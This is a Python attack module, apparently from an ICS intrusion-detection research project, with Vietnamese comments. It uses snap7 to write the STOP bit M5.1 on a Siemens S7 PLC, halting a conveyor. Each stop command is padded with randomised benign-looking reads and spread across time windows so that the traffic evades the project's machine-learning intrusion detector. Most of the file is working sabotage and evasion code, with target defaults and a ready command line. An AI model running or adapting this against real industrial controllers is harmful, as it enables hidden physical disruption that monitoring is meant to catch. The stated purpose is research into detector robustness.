"""
EVASION_SHAPED_WRITE
Adversarial evasion attack nham vao chinh ML-IDS cua project nay (khac voi
CONCEALED_STOP_ATTACK lua NGUOI VAN HANH -- cai nay lua MO HINH ML). Y tuong
theo dong nghien cuu 2024-2025: "On Practical Realization of Evasion Attacks
for ICS" (2024), "FEVA-ICS" (2025) -- khi phong thu la 1 model ML, attack the
he moi khong an khoi mat nguoi ma nan dac trung (feature) sao cho window roi
vao vung ma model da hoc la 'benign'.

============================================================================
KHAC BIET SONG CON voi STEALTHY_WRITE (da bi go khoi Day 7 vi trung):
STEALTHY_WRITE chi "ghi thua de ne threshold" mot cach mu quang. EVASION nay
NAN traffic theo DUNG cac feature ma feature-extractor that cua project
(extract_s7_features.py) dung de phat hien, dua tren hieu biet white-box ve
extractor do (project so huu extractor nen day la white-box hop le).

=> Gia tri cua module NAY chi ton tai khi di kem BUOC DO detection rate A/B
   (thô vs shaped) tren model that. Neu chi chay module ma khong do, no THOAI
   BIEN thanh STEALTHY_WRITE. Xem phan "DANH GIA" cuoi docstring.
============================================================================

CAC FEATURE THAT bi nham toi (nguon: extract_s7_features.py, window mac dinh
5s theo collect_dataset.py / extract_s7_features):
  - s7_write_read_ratio = s7_write_count / max(s7_read_count,1)
       RWRITE thô: cao (>5). Benign: thap (read ap dao).
       NAN: chen nhieu READ benign quanh moi WRITE -> keo ratio ve vung benign.
  - s7_write_count (moi window 5s)
       RWRITE thô: burst cao. Benign: thap.
       NAN: toi da --writes-per-window (mac dinh 1) write moi window, rai ra.
  - s7_sequential_offset_score / s7_write_sequential_offset_ratio
       Enum/ghi offset lien tiep: cao. Benign: thap.
       NAN: chi ghi 1 offset (M5.1 STOP), khong tao chuoi offset.
  - s7_write_to_plc_packet_ratio
       NAN: pha loang bang polling read o nhip HMI that.
Vung M (Merker) KHONG phai co lo ngay: benign HMI cung ghi Areas.MK
(collect_dataset.py legit-write) -> 1 write M doc co the tra tron.

CO CHE:
  Hanh dong pha hoai = SET bit STOP (M5.1) => bang tai dung that (giong hieu
  ung RWRITE_BURST/LOGIC_AWARE de A/B sach). Nhung thay vi burst, chi 1 write
  STOP duy nhat/window, chon dung 1 window, VUI trong 1 bien gioi cac READ
  benign o nhip HMI that (HMI_POLL_MIN/MAX). Bit STOP giu nguyen den khi
  restore -> tac dong that ma window chua write van "trong benign".

GIOI HAN THAT (khong phong dai, ghi ro cho bao cao):
  - Day la evasion white-box tren FEATURE EXTRACTOR (project so huu no), danh
    gia OFFLINE. KHONG phai closed-loop adversarial thoi gian thuc: train_ml.py
    HIEN KHONG luu model ra disk, nen khong the hoi model live trong luc tan
    cong. Muon closed-loop that su can them buoc luu/serve model.
  - Nguong "benign" cho tung feature nen duoc HIEU CHINH tu cac window benign
    that cua dataset (Day 1). Mac dinh trong module chi la uoc luong hop ly,
    khong phai gia tri toi uu da kiem chung.
  - QUAN TRONG: module nay NAN duoc cac feature VOLUME/RATE (write_read_ratio,
    write_count, sequential_offset) nhung KHONG giau duoc feature OFFSET: benign
    ghi offset 100 (collect_dataset.py write_offsets=[100]), con hanh dong pha
    hoai that o day la bit STOP offset 5 -- extractor theo doi s7_write_offset_*
    nen offset 5 van la dau hieu phan biet. Day la ket qua co gia tri (khong
    phai loi): "evasion danh bai feature volume nhung feature semantic/offset
    van robust hon" -- dung voi ky vong tu FEVA-ICS/defense literature. Neu
    muon danh gia rieng suc manh feature offset, chay them 1 bien the ghi vao
    offset 100 (marker, KHONG tac dong vat ly) de tach bach 2 loai feature.

DANH GIA (buoc bat buoc de module co y nghia):
  1. Chay module NAY co capture -> pcap co cac window "shaped attack".
  2. Chay 1 baseline THÔ (vd RWRITE burst hoac LOGIC_AWARE) co capture.
  3. extract_s7_features cho ca hai -> nap vao model that -> so detection
     rate: ky vong baseline bi phat hien cao, shaped bi phat hien thap hon
     ro ret. Con so do la ket qua chinh cho bao cao.

Goi tu bash:
  python -m attacks_ext.evasion_shaped_write \
      --target 192.168.210.211 --rack 0 --slot 1 --duration 300 \
      --window 5 --writes-per-window 1 --write-gap-windows 2 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import random
import time
from attacks_ext.config_ext import base_parser, write_label

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_bool, set_bool

# Cac vung READ benign giong HMI that hay doc (de traffic doc trong hop le,
# khong tao pattern enum tuan tu). (area, byte_offset, length).
BENIGN_READ_TARGETS = [
    (Areas.MK, 5, 2),    # M5-M6: START/STOP/Vat bits
    (Areas.MK, 54, 4),   # CD1
    (Areas.MK, 58, 4),   # CD2
    (Areas.MK, 70, 2),   # Nhap
    (Areas.MK, 74, 2),   # HienThi
]

STOP_BYTE = 5   # M5
STOP_BIT = 1    # M5.1 = STOP


def do_benign_reads(client, n: int) -> int:
    """Doc n lan tu cac target benign (thu tu ngau nhien de khong tao chuoi
    offset tuan tu). Tra ve so read thuc hien thanh cong."""
    ok = 0
    for _ in range(n):
        area, off, length = random.choice(BENIGN_READ_TARGETS)
        try:
            client.read_area(area, 0, off, length)
            ok += 1
        except Exception:
            pass
    return ok


def inject_stop_write(client) -> bool:
    """1 write STOP duy nhat (M5.1=True, M5.0=False) -- pha hoai that, giu
    nguyen do dai/khong tao chuoi offset. Read-modify-write dung 1 byte M5."""
    try:
        m5 = client.read_area(Areas.MK, 0, STOP_BYTE, 1)
        set_bool(m5, 0, STOP_BIT, True)
        set_bool(m5, 0, 0, False)  # START off
        client.write_area(Areas.MK, 0, STOP_BYTE, m5)
        return True
    except Exception as e:
        print(f"[WARN] inject STOP that bai: {type(e).__name__}: {e}")
        return False


def run(args):
    label_prefix = "EVASION_SHAPED_WRITE"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=(f"dur={args.duration}s window={args.window}s "
                      f"writes_per_window={args.writes_per_window} "
                      f"write_gap_windows={args.write_gap_windows}"))

    client = snap7.client.Client()
    original = None
    total_reads = 0
    total_writes = 0
    windows_elapsed = 0

    poll_min = float(args.read_cadence_min)
    poll_max = float(args.read_cadence_max)
    # so read/window de pha loang: dua tren nhip poll, toi thieu vai lan
    reads_per_window = max(3, int(args.window / max(poll_min, 0.1)))

    try:
        client.connect(args.target, args.rack, args.slot)
        print(f"[+] Connected. Shaped evasion (window={args.window}s, "
              f"~{reads_per_window} benign reads/window, "
              f"{args.writes_per_window} write/{args.write_gap_windows+1} windows)")
        m5_orig = client.read_area(Areas.MK, 0, STOP_BYTE, 1)
        original = {"START": get_bool(m5_orig, 0, 0), "STOP": get_bool(m5_orig, 0, STOP_BIT)}

        end_time = time.time() + args.duration
        while time.time() < end_time:
            window_deadline = time.time() + args.window
            # Chi ghi o window "duoc phep" (rai thua qua write_gap_windows),
            # va toi da writes_per_window write trong window do.
            allow_write = (windows_elapsed % (args.write_gap_windows + 1) == 0)
            writes_this_window = 0

            while time.time() < window_deadline and time.time() < end_time:
                # 1 nhip: doc benign, thi thoang xen 1 write neu con quota
                total_reads += do_benign_reads(client, 1)
                if allow_write and writes_this_window < args.writes_per_window:
                    # xac suat de write khong roi vao cung vi tri trong window
                    if random.random() < 0.35:
                        if inject_stop_write(client):
                            total_writes += 1
                            writes_this_window += 1
                            print(f"  [w{windows_elapsed}] shaped STOP write "
                                  f"(reads so far={total_reads})")
                time.sleep(random.uniform(poll_min, poll_max))

            # neu window duoc phep ma chua kip ghi (do xac suat), ghi bu 1 lan
            if allow_write and writes_this_window == 0 and time.time() < end_time:
                if inject_stop_write(client):
                    total_writes += 1
                    print(f"  [w{windows_elapsed}] shaped STOP write (bu cuoi window)")
            windows_elapsed += 1

    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        if original is not None and client.get_connected():
            try:
                m5 = client.read_area(Areas.MK, 0, STOP_BYTE, 1)
                set_bool(m5, 0, 0, original["START"])
                set_bool(m5, 0, STOP_BIT, original["STOP"])
                client.write_area(Areas.MK, 0, STOP_BYTE, m5)
                print(f"[*] Restored START={original['START']} STOP={original['STOP']}")
            except Exception as e:
                print(f"[ERR] Restore that bai, can khoi phuc thu cong: {e}")
        if client.get_connected():
            client.disconnect()
        est_ratio = total_writes / max(total_reads, 1)
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=(f"windows={windows_elapsed} reads={total_reads} "
                          f"writes={total_writes} "
                          f"est_write_read_ratio={est_ratio:.4f} target=M5.1_STOP"))
        print(f"[SUMMARY] windows={windows_elapsed} reads={total_reads} "
              f"writes={total_writes} est_write_read_ratio={est_ratio:.4f}")
        print("[NOTE] De module co y nghia: extract_s7_features tren pcap nay + "
              "1 baseline THÔ, nap vao model, so detection rate A/B (xem docstring).")


def main():
    p = base_parser("Adversarial Evasion Attack: feature-space-shaped S7 write vs project's own ML-IDS")
    p.add_argument("--target", default="192.168.210.211")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=1)
    p.add_argument("--window", type=float, default=5.0,
                   help="Feature window (s) -- KHOP voi window dataset (mac dinh 5s)")
    p.add_argument("--writes-per-window", type=int, default=1,
                   help="Toi da write doc moi window duoc phep (giu s7_write_count thap)")
    p.add_argument("--write-gap-windows", type=int, default=2,
                   help="So window CHI-DOC giua 2 window co write (rai thua them)")
    p.add_argument("--read-cadence-min", type=float, default=1.0,
                   help="Nhip poll read benign min (s) -- khop HMI_POLL_MIN_S")
    p.add_argument("--read-cadence-max", type=float, default=2.0,
                   help="Nhip poll read benign max (s) -- khop HMI_POLL_MAX_S")
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
